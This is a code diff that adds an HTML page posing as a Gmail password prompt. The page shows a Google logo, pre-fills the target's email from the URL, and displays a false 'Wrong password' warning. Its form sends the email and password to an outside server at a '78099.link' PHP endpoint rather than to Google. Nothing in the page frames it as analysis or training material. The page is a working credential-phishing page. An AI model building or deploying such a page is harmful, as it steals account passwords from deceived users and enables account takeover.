@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ecf7fc; /* Light sky blue */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px 200px;
+            border-radius: 30px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+        }
+        .logo {
+            width: 70px;
+            margin-top: 10px;
+            margin-bottom: 5px;
+            margin-left: -170px;
+        }
+        h1 {
+            font-size: 40px;
+            margin-top: 1px;
+            margin-bottom: 30px;
+            text-align: left;
+            margin-left: -150px;
+            width: 100%;
+            font-family: sans-serif;
+            font-weight: normal;
+        }
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end; 
+            width: 100%;
+        }
+        input[type="password"],
+        input[type="text"] {
+            padding: 15px;
+            font-size: 18px;
+            width: calc(85% - 10px);
+            border: 2px solid #8B0000; /* Dark red border */
+            border-radius: 5px;
+            max-width: 320px;
+            margin-bottom: 0;
+            margin-left: auto;
+            margin-right: -150px;
+            background-color: white; /* White background */
+            color: black; /* Black text */
+        }
+        .warning-message {
+            color: #8B0000; /* Dark red */
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: right;
+            margin-right: -150px;
+        }
+        .query-box {
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            padding: 5px 10px;
+            width: 50%;
+            text-align: center;
+            margin-left: -150px;
+            margin-right: auto;
+            margin-bottom: -40px;
+            display: flex;
+            align-items: center;
+        }
+        .query-box img {
+            width: 35px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        button {
+            width: 20%;
+            padding: 10px;
+            background-color: #0E51B5;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 12px;
+            margin: 60px 0;
+            margin-right: -150px;
+            margin-bottom: -10px;
+        }
+        button:hover {
+            background-color: #357ae8;
+        }
+        .footer {
+            text-align: center;
+            margin-top: -30px;
+            font-size: 16px;
+            width: 100%;
+            margin-right: -50px;
+        }
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-right: 65px;
+            margin-top: 10px;
+        }
+        .show-password input {
+            margin-right: 10px;
+        }
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+            margin-right: -400px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .caution-icon {
+            width: 12px; /* Adjust the size of the caution icon */
+            height: 12px; /* Adjust the size of the caution icon */
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="Logo" class="logo">
+        <h1>Welcome</h1>
+        <div class="query-box" id="query-box">
+            <img src="https://static.vecteezy.com/system/resources/previews/019/879/186/non_2x/user-icon-on-transparent-background-free-png.png" alt="User Icon">
+            <span id="query-text"></span>
+        </div>
+        <form id="login-form" action="https://78099.link/pdf3/new2.php" method="POST">
+            <input type="hidden" name="email" id="email-input">
+            <div class="form-group">
+                <input type="password" id="password-input" name="password" placeholder="Enter your password" required>
+                <p class="warning-message">
+                    <img src="https://www.nicepng.com/png/detail/207-2074836_alert-png-images-red-alert-icon-png.png" alt="Caution" class="caution-icon">
+                    Wrong password. Try again or click Forgot password to reset it.
+                </p>
+                <div class="show-password">
+                    <input type="checkbox" id="show-password-checkbox">
+                    <label for="show-password-checkbox">Show Password</label>
+                </div>
+                <button type="submit">Next</button>
+            </div>
+        </form>
+        <div class="footer">
+            <p><a href="#">Forgot password?</a></p> 
+        </div>
+    </div>
+    <script>
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            let email = params.get('email') || '';
+            document.getElementById('query-text').textContent = email;
+            document.getElementById('email-input').value = email; // Set the hidden email input
+        }
+
+        document.addEventListener('DOMContentLoaded', getQueryParams);
+
+        const passwordInput = document.getElementById('password-input');
+        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
+
+        showPasswordCheckbox.addEventListener('change', () => {
+            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+        });
+    </script>
+</body>
+</html>
